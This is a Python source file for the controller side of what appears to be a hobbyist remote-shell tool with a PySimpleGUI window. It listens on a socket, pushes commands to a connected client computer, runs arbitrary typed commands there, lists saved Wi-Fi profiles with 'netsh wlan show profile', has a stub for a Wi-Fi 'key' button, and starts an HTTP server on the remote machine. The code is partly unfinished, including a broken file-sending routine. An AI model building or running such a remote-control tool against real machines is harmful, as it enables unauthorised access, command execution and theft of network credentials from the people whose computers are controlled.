import socket
import sys
import subprocess
import webbrowser
import time
import tkinter as tk
import PySimpleGUI as sg
import PySimpleGUI as w
import os
import tqdm
FORMAT='utf-8'
from tkinter import *
BUFFER_SIZE=1048576
SEPARATOR="<SEPARATOR>"


# Create a socket

def create_socket():
    try:
        global host
        global port
        global s
        host = "127.0.0.1"
        port = 8888
        s = socket.socket()

    except socket.error as msg:
        print("Something went wrong while creating the socket." + str(msg)+"\n")


# Binding Port and Host together and listening for connection


def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port " + str(port)+"\n")

        s.bind((host, port))
        s.listen(5)  # After 5 bad connection s.listen() will throw error

    except socket.error as msg:
        print("Something went wrong while binding the port." + str(msg) + "\n Retrying...")
        bind_socket()


# Establishing connection/Accepting connection with a client (Socket must be listening)

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established, the IP is: " + str(address[0]) + " and the port is: " + str(address[1]) +"\n")
    send_commands(conn)
    conn.close()


# Send commands to client's computer, we are calling this above in socket_accept
def send_commands(conn):
    b='ipconfig'
    conn.send(str.encode(b))
    
    client_response = str(conn.recv(1048576), "utf-8")  # Receive incoming data in chunks of 1024 bits
    # then convert them to utf-8 format so that they could be converted to string
   
       
    sg.theme('DarkTeal9')
    layout = [  [sg.Text('Enter a command to execute (e.g. dir or ls)')],
                [sg.Input(key='_IN_')],             # input field where you'll type command
                [sg.Output(size=(90,35))],          # an output area where all print output will go
                [sg.Button('Run'), sg.Button('Exit'),sg.Button('refresh')],
                [sg.Button('wlan profiles'),sg.Button('key')],
                [sg.Button('send files')],
                [sg.Button('run http server')]]     # a couple of buttons
    
    window = sg.Window('Realtime Shell Command Output', layout)
    
    while True:     # Event Loop
        event, values = window.Read()
        cmd=values['_IN_']
        #default process
        print(client_response, end="")  # end="" puts the cursor in the terminal on next line
       
       
        if event in (None, 'Exit'):# checks if user wants to exit
            conn.close()
            s.close()
            sys.exit()
            break
        if event == 'key':
            
            '''
             r=tk.Tk()
             r.geometry("500x500")
             r.title('pop up')
             r.resizable(width=0,height=0)
             img = PhotoImage(file="1.gif")
             label = Label(r,image=img)
             label.place(x=0, y=0)
             '''
        if event == 'Run':    # the two lines of code needed to get button and run command
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1048576), "utf-8")  # Receive incoming data in chunks of 1024 bits
             # then convert them to utf-8 format so that they could be converted to string
                print(client_response, end="")  # end="" puts the cursor in the terminal on next line
                
        if event == 'wlan profiles':
             p='netsh wlan show profile'
             conn.send(str.encode(p))
             client_response = str(conn.recv(1048576), "utf-8")  # Receive incoming data in chunks of 1024 bits
             # then convert them to utf-8 format so that they could be converted to string
             print(client_response, end="")  # end="" puts the cursor in the terminal on next line
            
             
       
             
        
             

        if event=='run http server':
            a='python3 -m http.server'
            conn.send(str.encode(a))
            webbrowser.open_new_tab('http://127.0.0.1:8000/')
        if event=='send files':
            p='send files'
            #sending the sending the command
            conn.send(str.encode(p))
           # time.sleep(4)
          
          
            if len(sys.argv) == 1:
              fname = sg.popup_get_file('Document to open')
            else:
              fname = sys.argv[1]

            if not fname:
                sg.popup("Cancel", "No filename supplied")
                raise SystemExit("Cancelling: no filename supplied")
            else:
                 sg.popup('The filename you chose was', fname)
                 #fname=filename with directory(file path)
                 #sending the filename
                 filename=os.path.basename(fname)
                 filesize=os.path.getsize(filename)
                     
        if event=='refresh':
          window.Refresh() if window else None 

            
            
    window.Close()

def main():
    print("Starting the server-side script! \n")
    create_socket()
    bind_socket()
    socket_accept()
    bg=PhotoImage(file="1.gif")


#start the main funtion
if __name__=="__main__":
    main()

